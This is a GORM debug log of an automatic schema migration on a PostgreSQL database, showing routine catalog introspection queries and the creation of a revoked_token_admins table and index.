[0m[33m[1.132ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'admins' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'admins' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.226ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'admins' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'admins' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.089ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'admins' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'admins' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.043ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'admins' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'admins' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.059ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'admins' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'admins' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.670ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'admins' AND constraint_name = 'fk_admins_user'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.819ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'admins' AND indexname = 'idx_admins_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.758ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'admins' AND indexname = 'idx_admin_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.682ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_tokens' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.343ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.636ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_tokens'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.748ms] [34;1m[rows:-][0m SELECT * FROM "revoked_tokens" LIMIT 5

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.048ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'revoked_tokens' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.165ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'revoked_tokens'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.652ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'revoked_tokens'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.164ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_tokens' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.243ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_tokens' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.254ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_tokens' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.109ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_tokens' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.123ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_tokens' AND column_name = 'token') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.764ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'revoked_tokens' AND indexname = 'idx_revoked_tokens_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.560ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_token_admins' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[20.583ms] [34;1m[rows:0][0m CREATE TABLE "revoked_token_admins" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"admin_id" bigint,"revoked_token_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_revoked_token_admins_admin" FOREIGN KEY ("admin_id") REFERENCES "admins"("id"),CONSTRAINT "fk_revoked_token_admins_revoked_token" FOREIGN KEY ("revoked_token_id") REFERENCES "revoked_tokens"("id"))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[11.029ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_revoked_token_admins_deleted_at" ON "revoked_token_admins" ("deleted_at")

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.879ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.446ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.868ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'users'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.654ms] [34;1m[rows:-][0m SELECT * FROM "users" LIMIT 5

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[11.245ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[12.742ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.581ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'users'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.229ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.170ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.124ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.178ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.156ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'user_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.138ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'first_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.170ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'last_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.177ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'middle_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.117ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.216ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.182ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'password') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.230ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.132ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.262ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.912ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'users' AND indexname = 'idx_users_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.784ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.373ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.132ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'instructors'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.656ms] [34;1m[rows:-][0m SELECT * FROM "instructors" LIMIT 5

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.942ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.337ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.564ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'instructors'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.231ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.217ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.172ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.159ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.126ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'account_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
